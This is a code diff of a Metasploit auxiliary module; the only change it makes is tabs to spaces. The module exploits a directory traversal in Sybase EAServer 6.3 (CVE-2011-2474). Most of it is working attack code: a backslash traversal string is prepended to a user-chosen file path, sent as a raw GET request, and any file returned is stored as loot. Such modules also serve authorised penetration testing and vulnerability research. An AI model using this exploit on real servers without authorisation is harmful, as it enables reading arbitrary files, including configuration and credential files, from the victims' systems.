@@ -9,78 +9,78 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Auxiliary::Scanner
-	include Msf::Auxiliary::Report
-	include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::HttpClient
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'Sybase Easerver 6.3 Directory Traversal',
-			'Description'    => %q{
-					This module exploits a directory traversal vulnerability found in Sybase
-				EAserver's Jetty webserver on port 8000. Code execution seems unlikely with
-				EAserver's default configuration unless the web server allows WRITE permission.
-			},
-			'References'     =>
-				[
-					[ 'CVE', '2011-2474' ],
-					[ 'OSVDB', '72498' ],
-					[ 'URL', 'http://www.sybase.com/detail?id=1093216' ],
-					[ 'URL', 'https://labs.idefense.com/verisign/intelligence/2009/vulnerabilities/display.php?id=912' ],
-				],
-			'Author'         =>
-				[
-					'Sow Ching Shiong', #Initial discovery (via iDefense)
-					'sinn3r'
-				],
-			'License'        => MSF_LICENSE,
-			'DisclosureDate' => "May 25 2011"
-		))
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Sybase Easerver 6.3 Directory Traversal',
+      'Description'    => %q{
+          This module exploits a directory traversal vulnerability found in Sybase
+        EAserver's Jetty webserver on port 8000. Code execution seems unlikely with
+        EAserver's default configuration unless the web server allows WRITE permission.
+      },
+      'References'     =>
+        [
+          [ 'CVE', '2011-2474' ],
+          [ 'OSVDB', '72498' ],
+          [ 'URL', 'http://www.sybase.com/detail?id=1093216' ],
+          [ 'URL', 'https://labs.idefense.com/verisign/intelligence/2009/vulnerabilities/display.php?id=912' ],
+        ],
+      'Author'         =>
+        [
+          'Sow Ching Shiong', #Initial discovery (via iDefense)
+          'sinn3r'
+        ],
+      'License'        => MSF_LICENSE,
+      'DisclosureDate' => "May 25 2011"
+    ))
 
-		register_options(
-			[
-				Opt::RPORT(8000),
-				OptString.new("FILEPATH", [false, 'Specify a parameter for the action'])
-			], self.class)
+    register_options(
+      [
+        Opt::RPORT(8000),
+        OptString.new("FILEPATH", [false, 'Specify a parameter for the action'])
+      ], self.class)
 
-		deregister_options('RHOST')
-	end
+    deregister_options('RHOST')
+  end
 
-	def run_host(ip)
-		# No point to continue if no filename is specified
-		if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
-			print_error("Please supply the name of the file you want to download")
-			return
-		end
+  def run_host(ip)
+    # No point to continue if no filename is specified
+    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
+      print_error("Please supply the name of the file you want to download")
+      return
+    end
 
-		print_status("Attempting to download: #{datastore['FILEPATH']}")
+    print_status("Attempting to download: #{datastore['FILEPATH']}")
 
-		# Create request
-		traversal = ".\\..\\.\\..\\.\\..\\.\\.."
-		res = send_request_raw({
-			'method' => 'GET',
-			'uri'    => "/#{traversal}\\#{datastore['FILEPATH']}"
-		}, 25)
+    # Create request
+    traversal = ".\\..\\.\\..\\.\\..\\.\\.."
+    res = send_request_raw({
+      'method' => 'GET',
+      'uri'    => "/#{traversal}\\#{datastore['FILEPATH']}"
+    }, 25)
 
-		print_status("Server returns HTTP code: #{res.code.to_s}")
+    print_status("Server returns HTTP code: #{res.code.to_s}")
 
-		# Show data if needed
-		if res and res.code == 200
-			vprint_line(res.to_s)
-			fname = File.basename(datastore['FILEPATH'])
+    # Show data if needed
+    if res and res.code == 200
+      vprint_line(res.to_s)
+      fname = File.basename(datastore['FILEPATH'])
 
-			path = store_loot(
-				'easerver.http',
-				'application/octet-stream',
-				ip,
-				res.body,
-				fname
-			)
-			print_status("File saved in: #{path}")
-		else
-			print_error("Nothing was downloaded")
-		end
-	end
+      path = store_loot(
+        'easerver.http',
+        'application/octet-stream',
+        ip,
+        res.body,
+        fname
+      )
+      print_status("File saved in: #{path}")
+    else
+      print_error("Nothing was downloaded")
+    end
+  end
 end
 
 =begin
